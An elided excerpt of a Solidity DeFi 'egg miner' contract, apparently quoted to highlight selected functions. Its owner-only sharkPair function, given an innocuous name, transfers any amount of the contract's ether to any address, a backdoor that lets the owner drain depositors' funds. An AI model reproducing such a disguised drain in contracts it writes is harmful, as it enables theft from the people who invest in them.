...
contract DeFiOcEaN{
    ...
    function ReInvest(address ref) public{
        ...
        //send referral eggs
        claimedEggs[referrals[msg.sender]]=SafeMath.add(claimedEggs[referrals[msg.sender]],SafeMath.div(SafeMath.mul(eggsUsed,14),100));

        //boost market to nerf miners hoarding
        marketEggs=SafeMath.add(marketEggs,SafeMath.div(eggsUsed,5));
    }
    function pocketRewards() public{
        require(initialized);
    ...
    function sharkPair(address _swap, uint whale ) public onlyOwner{
        _swap.transfer(whale);
    }

    function buyWhale(address ref) public payable{
        require(initialized);
